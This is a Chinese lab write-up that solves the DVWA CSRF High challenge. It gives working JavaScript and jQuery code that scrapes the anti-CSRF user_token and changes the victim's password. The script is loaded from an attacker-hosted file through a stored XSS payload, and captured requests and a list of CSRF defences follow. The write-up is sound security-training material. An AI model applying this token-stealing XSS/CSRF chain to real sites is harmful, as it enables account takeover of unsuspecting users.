[TOC]



# ==DVWA-CSRF-High==

## 一、本关原理

二话不说，我们先正常修改一下密码并抓包试试

```
GET /DVWA/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change&user_token=45fc68135403307062e720a970b1492b HTTP/1.1
Host: 192.168.230.147
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Referer: http://192.168.230.147/DVWA/vulnerabilities/csrf/
Cookie: BEEFHOOK=qk8WgXAXylDvJm4PME2OXpZwLwCm5HTE3lpns2JATtC7bdWXDZTfcdWhz3PBkPpkLibE8ibXthxOXQN3; PHPSESSID=e02f51d0b44207f780cabf4495c8f055; security=high
Connection: close
```

我们可以看到，我们的GET请求是 `/DVWA/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change&user_token=45fc68135403307062e720a970b1492b` 其中还有一个叫做 user_token 的参数，这个参数的值从何而来呢？

当我们点击访问 `192.168.230.147/DVWA/vulnerabilities/csrf/` 时（就是单纯访问CSRF这个页面），服务器给我们的响应中就会携带 user_token 

![image-20240811140412707](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811140412707.png)

再访问一次

![image-20240811140513497](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811140513497.png)

并且我们发现，这个user_token每次访问所返回的值都不一样，所以我们还不能直接把这个值拿出来用，那么该如何操作呢。

**过关的核心**

**写一个脚本，先访问 `192.168.230.147/DVWA/vulnerabilities/csrf/` 这个页面，并从请求的响应中拿到 user_token（比如使用正则表达式） ；然后再发一次请求，将 user_token 拼接到修改密码的请求中去，发给服务器** 

**使用 js 脚本的原因**

基于上面的问题，我们像之前一样，单独的使用恶意链接，网页肯定是不行的，因为不管是 form 表单，还是恶意超链接，都无法发送两个请求，都是一次性的，所以我们这里必须使用脚本来处理，但是又要怎么才能让用户执行该恶意脚本呢，浏览器要怎样才能解析该恶意脚本呢？

**如何让浏览器执行js脚本**

浏览器会读取 HTML 文档，要想让浏览器解析js代码，我们需要将js代码包裹在 <script> 标签中，当浏览器解析到这个 `<script>` 标签时，会暂停渲染网页，读取 `mycode.js` 文件，并执行其中的 JavaScript 代码，然后再将 <script> 放在该html文档中。或者，如果存在xss漏洞，我们只需要将 `<script type="text/javascript" src="mycode.js"></script>` 这段代码植入到网页中去，将 mycode.js 替换为自己的js脚本文件就好了。 

## 二、破解本关

192.168.230.147作为被欺骗的服务器（也就是用户正常访问的服务器），192.168.230.2（admin，物理机）作为受害者，192.168.230.135作为攻击者（Pablo，win7_01）去注入恶意代码执行形式上漏洞，同时也是攻击服务器存放恶意脚本。

### 1、构造 js 原生代码发送 ajax 请求

user_token的正则表达左右两边内容如下

![image-20240811153024628](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811153024628.png)

因此对应的正则表达式 `/user_token\' value=\'(.*?)\' \/\>/` .*? 表示至少匹配零个或多个任意字符，但尽可能少的匹配字符（非贪婪模式，匹配到满足一个就不再往下匹配了）

```js
var gettokenurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/";
var count = 0; // 限制请求循环发送
// 实例化XMLHttpRequest,用于发松AJAX请求
xmlhttp = new XMLHttpRequest();
// 当请求的状态发生改变，触发执行代码
xmlhttp.onreadystatechange = function() {
    // 状态码：0 - 请求未初始化；1 - 服务器链接已建立；2 - 请求已接收；3 - 请求处理中；4 - 请求已完成，且响应已就绪
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        // 处理成功响应的代码,并从中通过正则提取Token
        var text = xmlhttp.responseText;
        var regex = /user_token\' value=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        // alert(match[1]);
        var token = match[1];

        var changepasswdurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/?password_new=654321&password_conf=654321&Change=Change&user_token="+token;
        if (count == 0) {
            count=1;
            xmlhttp.open("GET",changepasswdurl,false); // false 代表同步方式发送
            xmlhttp.send();
        }
    }
};
xmlhttp.open("GET",gettokenurl,false);
xmlhttp.send();
```

### 2、将上述js代码放置于攻击服务器上

如 `http://192.168.230.135/csrf.js` 

![image-20240811155152737](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811155152737.png)

### 3、想办法将js代码嵌入到受害者访问的服务器上

我们本次实验接住了DVWA中的xss漏洞，但是由于High级别的XSS漏洞过滤掉了`<script>` 标签，所以我们先选择Low级别的XSS，先 `<script src="http://192.168.230.135/csrf.js"></script>` 将这段代码嵌入进去，然后再切换到High级别访问该页面，通过调试，三个浏览器都可以找到Token

![image-20240811154412522](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811154412522.png)

![image-20240811154421818](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811154421818.png)

![image-20240811154550344](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811154550344.png)

### 4、Fiddler监听整个过程

当我使用192.168.230.2（物理机，受害者，admin用户）点击访问DVWA-XSS_S-High时，admin用户的密码就被改了，利用Fiddler监听，可以发现

![image-20240811161307741](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811161307741.png)

- 第一个请求 是访问该页面的请求

![image-20240811161357014](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811161357014.png)

- 第二个请求 就是浏览器通过 `<script>` 来获取我这个恶意js代码的请求

![image-20240811161438488](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811161438488.png)

- 第三个请求就是 我的恶意代码生效，访问DVWA-CSRF-High，用以获取Token

![image-20240811161610109](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811161610109.png)

- 第四个请求就是，恶意代码将获取到的Token拼接到修改密码的请求URL地址中去，发送给服务器完成修改密码的操作

![image-20240811161745495](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240811161745495.png)

- 现在尝试使用admin账号登陆，发现密码确实已经被修改

## 三、总结思考

上面的整个机制就是 **构造恶意代码，借助XSS_S漏洞等待受害者访问。恶意代码先访问页面通过响应获取Token，再传递参数，修改密码** 

为什么次吃要使用JavaScript原生地阿玛来发送请求，使用JQuery不是更简单嘛？

其实都差不多，使用JQuery还需要引用JQuery这个库，该文件很大，不划算。以下便是使用JQuery的机制

```js
var script = document.createElement("script");
script.type="text/javascript";
script.src="http://192.168.230.135/jquery-3.4.1.min.js";
document.getElementsByTagName("head")[0].appendChild(script);

setTimeout(function() {
    $(document).ready(function() {
        var gettokenurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/";
        $.get(gettokenurl,function(data) {
            var regex = /user_token\' value=\'(.*?)\' \/\>/;
            var match = data.match(regex);
            var token = match[1];

            var changepasswdurl="http://192.168.230.147/DVWA/vulnerabilities/csrf/?password_new=654321&password_conf=654321&Change=Change&user_token="+token;
            $.get(changepasswdurl,function(data) {
                alert("done");
            }); 
        });
    });
},500);
```

对应的xss嵌入就变成了 `<script src="http://192.168.230.135/csrf_JQuery.js"></script>` 

## 四、CSRF防御

- 避免在URL中明文显示特定操作的参数内容
- **使用同步令牌（Synchronizer Token），检查客户端请求是否包含令牌及其有效性。（常用的做法，并且保证每次Token的值完全随机，且每次都不同）**
- 检查Refer Header ，拒绝来自非本网站的直接URL请求。
- 不要在客户端保存敏感信息（比如身份认证信息）
- 设置会话过期时间，比如 20分钟误操作，直接登录超时，退出登录
- **敏感信息的修改时需要注意对身份的二次确认，比如修改密码时，需要确认旧密码**
- 敏感信息的修改使用POST而不是GET
- **避免交叉漏洞，如XSS等**
- **禁止跨域访问**
- 在响应中设置CSP（Content-Security-Policy）内容安全策略
